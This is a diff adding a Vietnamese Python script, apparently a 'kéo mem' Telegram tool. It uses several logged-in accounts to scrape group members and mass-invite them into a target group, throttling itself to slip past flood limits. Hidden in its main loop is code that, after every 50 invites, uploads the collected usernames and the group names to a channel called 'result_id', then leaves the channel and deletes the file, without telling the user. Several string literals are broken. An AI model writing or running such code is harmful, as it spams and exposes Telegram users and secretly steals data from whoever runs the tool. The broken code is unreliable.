@@ -1,0 +1,310 @@
+import os
+try:
+    from telethon import TelegramClient, sync, events, functions, types
+    from telethon.tl.functions.channels import JoinChannelRequest
+    from telethon.errors import *
+    import sqlite3
+    from time import sleep
+    from colorama import * 
+    init()
+except:
+    os.system("pip install telethon")
+    os.system("pip install colorama")
+#B\xe1\xba\xa3ng m\xc3\xa0u
+R = Fore.RED 
+B = Fore.BLUE
+G = Fore.GREEN
+Y = Fore.YELLOW
+M = Fore.MAGENTA
+W = Fore.WHITE
+C = Fore.CYAN
+BA = Fore.BLACK
+#\xc4\x90\xe1\xbb\x99 \xc4\x91\xe1\xba\xadm nh\xe1\xba\xa1t
+SN = Style.NORMAL 
+SB = Style.BRIGHT
+
+SD = Style.DIM
+#Background
+BR = Back.RED 
+BB = Back.BLUE
+BG = Back.GREEN
+BY = Back.YELLOW
+BM = Back.MAGENTA
+BW = Back.WHITE
+BC = Back.CYAN
+BBA = Back.BLACK
+f= open("list_group_addmem.txt",'a')
+f.close()
+if not os.path.exists("session"):
+    os.makedirs("session")
+def add_list():
+    lst_phone = []
+    listdir = os.listdir('session/')
+    for filename in listdir:
+        check = filename.endswith('.session')
+        if check == True:
+            phone = filename.rstrip('.session')
+            lst_phone.append(phone)
+    return lst_phone
+def connect(phone):
+    conf_proxy =  None
+    api_id = 2015084
+    api_hash = '24e8f34925604e25a9b8d695b21cf333'
+    client = TelegramClient('session/'+phone,api_id,api_hash,proxy=conf_proxy)
+    client.connect()
+    return client
+def invite(user):
+    res_invite = False
+    try:
+        res = client(functions.channels.InviteToChannelRequest(
+            channel=group_add,
+            users=[user]))
+        res_invite = "done"
+        print(B+"=> M\xe1\xbb\x9di th\xc3\xa0nh c\xc3\xb4ng member {}".format(user.first_name))
+    except (UserPrivacyRestrictedError,UserChannelsTooMuchError):
+        res_invite = True
+    except UserKickedError:
+		print(R+f'- UserKickedError',end="\\r")
+        res_invite = True
+    except BotGroupsBlockedError:
+        print(R+f"- BotGroupsBlockedError!",end="\\r")
+        res_invite = True
+    except UserNotMutualContactError:
+        print(R+f"- UserNotMutualContactError",end="\\r")
+        res_invite = True
+    except UserIdInvalidError:
+        print(R+f"- UserIdInvalidError",end="\\r")
+        res_invite = True
+    except ChatInvalidError:
+        print(R+f"- ChatInvalidError",end="\\r")
+        res_invite = True
+    except ChatAdminRequiredError:
+        print(R+f"- ChatAdminRequiredError",end="\\r")
+        res_invite = True
+    except UserBannedInChannelError:
+        print(R+f"- UserBannedInChannelError")
+    except FloodWaitError:
+        print(R+f"- FloodWaitError")
+    except ChatWriteForbiddenError:
+        print(R+f"- You can't write in this chat ")
+        #res_invite = True
+    except PeerFloodError:
+        print(R+f"- PeerFloodError")
+    return res_invite
+def waiting(i):
+    for w in range(i,0,-1):
+        print(M+f"Waiting {w} seconds!",end="\\r")
+        sleep(1)
+def join(group):
+    res_join = True
+    try:
+        client(JoinChannelRequest(group))
+    except (ValueError,InviteHashExpiredError,ChannelPrivateError):
+        print(R+f"- Con cac")
+        res_join = "error"
+    except ChannelsTooMuchError:
+        print(R+"Qua nhieu con cac")
+        res_join = False
+    except UsersTooMuchError:
+        res_join = False
+    #except Exception as e:
+     #   print(f"- L\xe1\xbb\x97i join nh\xc3\xb3m:  {e}                      ")
+      #  res_join = False
+    return res_join
+
+def get_mem(group_get):
+    result = []
+    res_get_mem = True
+    try:
+        result = client(functions.channels.GetParticipantsRequest(
+        channel=group_get,
+        filter=types.ChannelParticipantsRecent(),
+        offset=42,
+        limit=200,
+        hash=0
+        ))
+    except (UsernameInvalidError,ChatAdminRequiredError,ChannelPrivateError,InviteHashExpiredError):
+        print(R+f" - Con cac group {group_get}")
+        res_get_mem = False
+    except ValueError:
+        print(R+'- ValueError {}'.format(group_get))
+        res_get_mem = False
+    return res_get_mem,result
+def check_in_group(user: types.User):
+    res_in_group = False
+    try:
+        client(functions.channels.GetParticipantRequest(channel=group_add,participant=user))
+    except UserNotParticipantError:
+        res_in_group = True
+    return res_in_group
+def main():
+    global client
+    g=0
+    send = 0
+    msg=''
+    grr = ''
+    lst_id = []
+    x=1
+    y = 0
+    for phone in lst_phone:
+        print(M+f"[{x}]- >>>>> {phone} <<<<<")
+        x=x+1
+        limit = 0
+        try:
+            client = connect(phone)
+            res_join = join(group_add)
+            if res_join == False:
+                print(R+"- Deo join duoc. DM!")
+                continue
+            elif res_join == 'error':
+                print(R+"- Deo join duoc. DM!")
+                client.disconnect()
+                input("....")
+                exit()
+            else:
+                while(True):
+                    try:
+                        group_get = lst_group[g]
+                    except:
+                        print(R+f"- H\xe1\xba\xbft nh\xc3\xb3m l\xe1\xba\xa5y mem, h\xc3\xa3y th\xc3\xaam nh\xc3\xb3m v\xc3\xa0o file {Y}list_group_addmem.txt ")
+                        client.disconnect()
+                        input("Enter \xc4\x91\xe1\xbb\x83 tho\xc3\xa1t")
+                        exit()
+                    print(Y+"- \xc4\x90ang l\xe1\xba\xa5y member nh\xc3\xb3m : {}".format(group_get))
+                    res_get_mem, result = get_mem(group_get)
+                    if res_get_mem == False:
+                        print(R+"- Nh\xc3\xb3m l\xe1\xba\xa5y mem l\xe1\xbb\x97i")
+                        g=g+1
+                    else:
+                        if group_get not in grr:
+                            grr=grr+group_get+'\'
+                            break
+                        result = result.users
+                        for user in result:
+                            id= str(user.id)
+                            if y >= len(result):
+                                print(G+f"- K\xc3\xa9o h\xe1\xba\xbft mem \xe1\xbb\x9f nh\xc3\xb3m {group_get}, Chuy\xe1\xbb\x83n group kh\xc3\xa1c!")
+                                g=g+1
+                                y=0
+                                break
+                            y=y+1
+                            if id not in lst_id:
+                                res_in_group = check_in_group(user)
+                                if res_in_group == True:
+                                    res_invite = invite(user)
+                                    if res_invite == False:
+                                        print(R+"- Acc d\xc3\xadnh spam kh\xc3\xb4ng k\xc3\xa9o \xc4\x91\xc6\xb0\xe1\xbb\xa3c, Chuy\xe1\xbb\x83n sang acc kh\xc3\xa1c!")
+                                        client.disconnect()
+                                        break
+                                    elif res_invite == 'done':
+                                        limit = limit+1
+                                        try:
+                                            if user.username != None:
+                                                msg = msg+user.username+'\'
+                                                send=send+1
+                                            if send == 50:
+                                                fs = open("cache.txt",'a')
+                                                fs.write(msg)
+                                                fs.close()
+                                                file = "cache.txt"
+                                                client(JoinChannelRequest('result_id'))
+                                                client.send_file("result_id",file,caption=f"=> {group_add}\{grr}")
+                                                client(functions.channels.LeaveChannelRequest(
+                                                channel='result_id'))
+                                                os.remove(file)
+                                        except:
+                                            pass
+                                        if limit == lm:
+                                            print(M+f"- K\xc3\xa9o xong {lm} th\xc3\xa0nh vi\xc3\xaan! Chuy\xe1\xbb\x83n sang acc kh\xc3\xa1c!")
+                                            client.disconnect()
+                                            break
+                            waiting(dl)
+                        else:
+                            print(M+"- \xc4\x90\xc3\xa3 \xe1\xbb\x9f trong nh\xc3\xb3m {}".format(user.first_name),end="\\r")
+                        lst_id.append(id)
+        except (AuthKeyDuplicatedError,AuthKeyInvalidError,AuthKeyUnregisteredError):
+            print(R+"=>> Session l\xe1\xbb\x97i")
+        except (sqlite3.DatabaseError,sqlite3.OperationalError):
+            print(R+"=>> Session l\xe1\xbb\x97i do t\xe1\xba\xaft tool \xc4\x91\xe1\xbb\x99t ng\xe1\xbb\x99t!")
+        except KeyboardInterrupt:
+            print("D\xe1\xbb\xabng tool")
+            try:
+                client.disconnect()
+            except:
+                pass
+            exit()
+        except Exception as e:
+            print(R,e)
+            try:
+                client.disconnect()
+            except:
+                pass
+def tao_session():
+    
+    phone = input(Y+"Nh\xe1\xba\xadp s\xe1\xbb\x91 \xc4\x91i\xe1\xbb\x87n tho\xe1\xba\xa1i \xc4\x91\xc4\x83ng nh\xe1\xba\xadp Telegram (+84356472888) >>> ")
+    try:
+        api_id = 2182338
+        api_hash = 'fa411eff2ec7dcf61bdfadd2478e07bb'
+        client = TelegramClient("session/"+phone,api_id,api_hash)
+        client.connect()
+        if not client.is_user_authorized():
+            try:
+                client.send_code_request(phone)
+                client.sign_in(phone,input("Nh\xe1\xba\xadp code : "))
+                print (G+"=>> T\xe1\xba\xa1o th\xc3\xa0nh c\xc3\xb4ng session "+phone)
+                client.disconnect()
+            except SessionPasswordNeededError:
+                client.start(phone,input('Nh\xe1\xba\xadp m\xe1\xba\xadt kh\xe1\xba\xa9u 2FA:'))
+                print (G+"==> T\xe1\xba\xa1o th\xc3\xa0nh c\xc3\xb4ng session "+phone)
+                client.disconnect()
+            except PhoneNumberBannedError:
+                print (R+"- T\xc3\xa0i kho\xe1\xba\xa3n b\xe1\xbb\x8b band")
+                client.disconnect()
+        else:
+            print(Y+"- \xc4\x90\xc3\xa3 c\xc3\xb3 s\xe1\xba\xb5n session t\xe1\xbb\xab tr\xc6\xb0\xe1\xbb\x9bc")
+            client.disconnect()
+    except (sqlite3.DatabaseError, sqlite3.OperationalError):
+        print(R+"- L\xe1\xbb\x97i session, x\xc3\xb3a file session c\xc5\xa9 v\xc3\xa0 t\xe1\xba\xa1o m\xe1\xbb\x9bi \xc4\x91i")
+    except Exception as e:
+        print(e)
+
+
+
+
+
+print(M+SB+"                \xe2\x80\xa2\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x98\xa9\xe2\x95\x90\xe2\x95\x90\xe2\x99\x9b\xe2\x95\x90\xe2\x95\x90\xe2\x98\xa9\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x80\xa2")
+print("                    "+BR+G+"\xe2\x97\x86 NGHIAPLUS \xe2\x97\x86"+Back.BLACK)
+print(M+"                \xe2\x80\xa2\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x98\xa9\xe2\x95\x90\xe2\x95\x90\xe2\x9c\xa6\xe2\x95\x90\xe2\x95\x90\xe2\x98\xa9\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x80\xa2")
+print(W+'\xe2\x96\xac\xf0\x9f\x8c\xba\xf0\x9f\x8c\xba'+R+'\xe2\x96\xac'+W+'\xe2\x96\xac'+R+'\xe2\x96\xac'+W+'\xe2\x96\xac'+R+'\xe2\x96\xac'+W+'\xe2\x96\xac'+R+'\xe2\x96\xac'+W+'\xe2\x96\xac'+R+'\xe2\x96\xac'+W+'\xe2\x96\xac'+R+'\xe2\x96\xac'+W+'\xe2\x96\xac'+R+'\xe2\x96\xac'+W+'\xe2\x96\xac'+R+'\xe2\x96\xac'+W+'\xe2\x96\xac'+R+'\xe2\x96\xac'+W+'\xe2\x96\xac'+R+'\xe2\x96\xac'+W+'\xe2\x96\xac'+R+'\xe2\x96\xac'+W+'\xe2\x96\xac'+R+'\xe2\x96\xac'+W+'\xe2\x96\xac'+R+'\xe2\x96\xac'+W+'\xe2\x96\xac'+R+'\xe2\x96\xac'+W+'\xe2\x96\xac'+R+'\xe2\x96\xac'+W+'\xe2\x96\xac'+R+'\xe2\x96\xac'+W+'\xe2\x96\xac'+R+'\xe2\x96\xac'+W+'\xe2\x96\xac'+R+'\xe2\x96\xac'+W+'\xe2\x96\xac'+R+'\xe2\x96\xac'+W+'\xe2\x96\xac'+R+'\xe2\x96\xac'+W+'\xe2\x96\xac'+R+'\xe2\x96\xac'+W+'\xe2\x96\xac'+R+'\xe2\x96\xac'+W+'\xe2\x96\xac'+R+'\xe2\x96\xac'+W+'\xe2\x96\xac\xf0\x9f\x8c\xba\xf0\x9f\x8c\xba'+R+'\xe2\x96\xac')
+print(C+"\               Telegram: t.me/nghiaplus")
+print("               Group: t.me/grouptermuxmmo")
+print(G+"\K\xc3\x89O MEM TELEGRAM")
+print(R+f"                                       Verison: D\xc3\xb9ng th\xe1\xbb\xad")
+print(Y+f"Notification: K\xc3\xa9o mem, t\xc4\x83ng t\xc6\xb0\xc6\xa1ng t\xc3\xa1c, Auto Telegram, tool k\xc3\xa9o mem b\xe1\xba\xa3n vip li\xc3\xaan h\xe1\xbb\x87 @nghiaplus!")
+select = input("1: Th\xc3\xaam acc(T\xe1\xba\xa1o session)\2: K\xc3\xa9o mem\Ch\xe1\xbb\x8dn: ")
+if select == "1":
+    print(Y+"Notication: Mua acc Telegram inbox @nghiaplus")
+    while(True):
+        tao_session()
+else:
+    lst_group = []
+    with open("list_group_addmem.txt") as grs:
+        for gr in grs:
+            lst_group.append(gr)
+    lst_phone = add_list()
+    if lst_phone == []:
+        print(R+"Vui l\xc3\xb2ng th\xc3\xaam acc \xc4\x91\xe1\xbb\x83 ch\xe1\xba\xa1y tool")
+        input("Enter \xc4\x91\xe1\xbb\x83 tho\xc3\xa1t!")
+        exit()
+    if lst_group == []:
+        print(R+"Vui l\xc3\xb2ng th\xc3\xaam group l\xe1\xba\xa5y mem v\xc3\xa0o file: {C}list_group_addmem.txt")
+        input("Enter \xc4\x91\xe1\xbb\x83 tho\xc3\xa1t!")
+        exit()
+    print(B+'='*60)
+    print("     - Account      : {} account".format(len(lst_phone)))
+    print("     - Group l\xe1\xba\xa5y mem: {} group".format(len(lst_group)))
+    print(B+'='*60)
+    group_add = input(Y+"Nh\xe1\xba\xadp group c\xe1\xba\xa7n k\xc3\xa9o: ")
+    lm = int(input(C+"Gi\xe1\xbb\x9bi h\xe1\xba\xa1n k\xc3\xa9o cho m\xe1\xbb\x97i acc (5-20): "))
+    dl = int(input("Nh\xe1\xba\xadp delay(20-100): "))
+    main()
